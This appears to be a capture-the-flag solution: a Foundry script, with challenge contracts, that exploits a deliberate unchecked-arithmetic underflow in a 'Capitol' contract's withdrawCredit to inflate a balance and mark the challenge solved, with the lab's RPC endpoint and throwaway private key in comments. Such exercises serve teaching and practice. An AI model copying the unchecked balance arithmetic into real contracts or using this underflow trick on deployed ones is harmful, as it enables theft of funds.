// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x9D7e274514adD8C66b93e8bB7c33640c6DDED98D);
    address wallet = 0xE82DeBf7062a79fe7640e36Dc448E8FB52278106;
    Capitol public capitol = setup.capitol();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0xf05f196f20b5cb7bbe1657e4aa7bb11a71e0191277226386896e115e9a72a9b3);

        capitol.withdrawCredit(115792089237316195423570985008687907853269984655640564039457584007913129639937); // 2**256 - (10_000_000_000_000 ether - 1)
        capitol.richerThanOwner();

        console.log(setup.isSolved());
        vm.stopBroadcast();
    }
}

// UUID	9a95356a-12a7-4d28-a941-ab73edf95609
// RPC Endpoint	http://103.178.153.113:40001/9a95356a-12a7-4d28-a941-ab73edf95609
// Private Key	0xf05f196f20b5cb7bbe1657e4aa7bb11a71e0191277226386896e115e9a72a9b3
// Setup Contract	0x9D7e274514adD8C66b93e8bB7c33640c6DDED98D
// Wallet	0xE82DeBf7062a79fe7640e36Dc448E8FB52278106

contract Setup {
    Capitol public capitol;

    constructor() {
        capitol = new Capitol();
    }

    function isSolved() public view returns(bool){
        return capitol.isRicher();
    }

}

contract Capitol{
    
    bool public isRicher;
    address public owner;
    mapping(address => uint256) public balanceOf;

    constructor() {
        owner = msg.sender;
        balanceOf[owner] = 1_000_000_000 ether;
    }

    function depositCredit(uint256 _amount) public payable{
        require(_amount > 1 ether, "Minimum deposit is 1 ether");
        require(msg.value == _amount, "There seems to be a mismatch!");
        unchecked{
            balanceOf[msg.sender] += _amount;
        }
    }

    function withdrawCredit(uint256 _amount) public{
        require(_amount > 0, "Must be greater than zero!");
        unchecked{
            balanceOf[msg.sender] -= _amount;
        }
    }

    function richerThanOwner() public{
        // The Casino is Not that stupid, they know that the balance beyond that is CHEATING!
        if(balanceOf[msg.sender] < 10_000_000_000_000 ether && balanceOf[msg.sender] > balanceOf[owner]){
            isRicher = true;
        }
    }
}
